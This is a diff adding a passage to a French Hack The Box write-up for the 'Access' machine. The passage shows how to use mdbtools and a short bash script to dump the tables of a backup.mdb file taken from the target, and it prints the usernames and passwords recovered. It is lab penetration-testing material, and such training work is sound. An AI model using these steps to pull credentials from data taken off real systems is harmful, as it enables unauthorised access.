@@ -83,3 +83,38 @@ Voilà les fichiers ont été transférer avec succès, sans aucun problème don
 
 Enumeration MDB
 ----
+Nous allons installer un petit programme pour dump tout ça. Vous devez installé le paquet **mdbtools** avec apt, vous pouvez aussi également utilisé la version GUI avec **mdbtools-gmdb2**.
+
+Pour voir les tables utilisé la commande :
+
+    root@Computer:~/htb/writeup/Access# mdb-tables -1 backup.mdb
+    [...SNIP...]
+    auth_user
+    [...SNIP...]
+    
+J'ai créer un petit script en bash pour automatisé tout ça, et de chopper les mots de passes plus facilement grâce à mon petit script en bash.
+
+    #!/bin/sh
+
+    name_file=$1
+    # This variable will be the file.
+
+    for tables_names in $(mdb-tables -1 $name_file)
+    do
+      ExportCommand=("mdb-export $name_file $tables_names")
+      # Will execute the command.
+      if [ "$ExportCommand" != '' ]; then
+        $ExportCommand|grep ,26,
+      fi
+    done
+    
+Et la sortie du fichier :
+
+    root@Computer:~/htb/writeup/Access# bash server.sh backup.mdb 
+    25,"admin","admin",1,"08/23/18 21:11:47",26,
+    27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+    28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+    root@Computer:~/htb/writeup/Access#
+
+Parfait nous avons des identifiants, alors si vous souhaitez utilisé mon outils n'oublie pas de mettre le nom du fichier.
+**bash server.sh backup.mdb **
